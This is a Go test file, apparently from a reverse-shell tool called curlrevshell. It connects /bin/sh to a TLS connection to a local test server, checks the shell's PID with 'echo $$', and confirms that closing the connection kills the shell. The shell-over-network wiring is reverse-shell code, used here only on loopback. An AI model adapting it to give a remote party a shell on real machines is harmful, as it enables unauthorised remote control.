package crsdialer

/*
 * crsdialer_orphanshell_test.go
 * Make sure we don't leave a shell orphaned
 * By J. Stuart McMurray
 * Created 20250924
 * Last Modified 20260807
 */

import (
	"bufio"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os/exec"
	"strconv"
	"sync"
	"testing"

	"github.com/magisterquis/curlrevshell/internal/hsrv"
	"github.com/magisterquis/curlrevshell/lib/sstls"
)

// Make sure closing the connection doesn't leave a shell orphaned.
func TestDial_OrphanShell(t *testing.T) {
	/* TLS Listener. */
	l, err := sstls.Listen("tcp", "127.0.0.1:0", "", 0, "")
	if nil != err {
		t.Fatalf("Error listening: %s", err)
	}
	defer l.Close()

	/* HTTP Server. */
	var (
		hDone = make(chan struct{})
		pidCh = make(chan string, 1)
	)
	svr := httptest.NewUnstartedServer(http.HandlerFunc(func(
		w http.ResponseWriter,
		r *http.Request,
	) {
		defer close(pidCh) /* Cheesy idempotency. */
		defer close(hDone) /* Ditto. */

		/* Enable duplex comms. */
		defer r.Body.Close()
		if err := hsrv.StartFullDuplex(w, r); nil != err {
			t.Errorf("Error starting full duplex: %v", err)
			return
		}

		/* Ask the shell for its PID. */
		var (
			scanner = bufio.NewScanner(r.Body)
			wg      sync.WaitGroup
		)
		wg.Go(func() { /* Send echo $$. */
			if _, err := io.WriteString(
				w,
				"echo $$\n",
			); nil != err {
				t.Errorf("Error sending command: %v", err)
				return
			}
			if err := http.NewResponseController(
				w,
			).Flush(); nil != err {
				t.Errorf("Error flushing response: %v", err)
			}
		})
		wg.Go(func() { /* Read the PID. */
			if !scanner.Scan() {
				t.Errorf(
					"Error reading PID from shell: %v",
					scanner.Err(),
				)
				return
			}
			pidCh <- scanner.Text()
		})

		/* Wait for the PID command. */
		wg.Wait()

		/* Keep the shell alive, we'll close it later. */
		for scanner.Scan() {
		}
		if err := scanner.Err(); nil != err {
			t.Errorf(
				"Error discarding remaining shell output: %v",
				err,
			)
		}
	}))
	svr.Listener = l
	svr.Start()
	defer svr.Close()

	/* Connect to the server. */
	c, err := Dial(
		t.Context(),
		fmt.Sprintf("https://%s", l.Addr()),
		l.Fingerprint,
	)
	if nil != err {
		t.Fatalf("Error connecting to server: %v", err)
	}
	defer c.Close()

	/* Hook up a shell to the connection to the server. */
	sh := exec.Command("/bin/sh")
	sh.Stdin = c
	sh.Stdout = c
	sh.Stderr = c
	if err := sh.Start(); nil != err {
		t.Fatalf("Error starting shell: %s", err)
	}
	defer sh.Wait() /* For just in case. */

	/* PID should be the same as she shell's. */
	t.Run("shell_pid", func(t *testing.T) {
		/* Get what the shell reported. */
		pidS, ok := <-pidCh
		if !ok {
			t.Fatalf("Did not get PID from shell")
		} else if "" == pidS {
			t.Fatalf("Shell sent empty PID")
		}
		/* PID should be a number. */
		pid, err := strconv.Atoi(pidS)
		if nil != err {
			t.Errorf("Invalid shell PID %q: %v", pidS, err)
		}
		/* Same PID? */
		if got, want := pid, sh.Process.Pid; got != want {
			t.Errorf(
				"Shell sent back incorrect PID\n"+
					" got: %d\n"+
					"want: %d",
				got,
				want,
			)
		}
	})

	/* Close the connection, should kill the shell. */
	if err := c.Close(); nil != err {
		t.Errorf("Error closing shell connection: %v", err)
	}

	/* Wait for the shell to finish. */
	if got, want := sh.Wait(), net.ErrClosed; !errors.Is(got, want) {
		t.Errorf("Shell exited with error: %v", err)
	}
	<-hDone
}
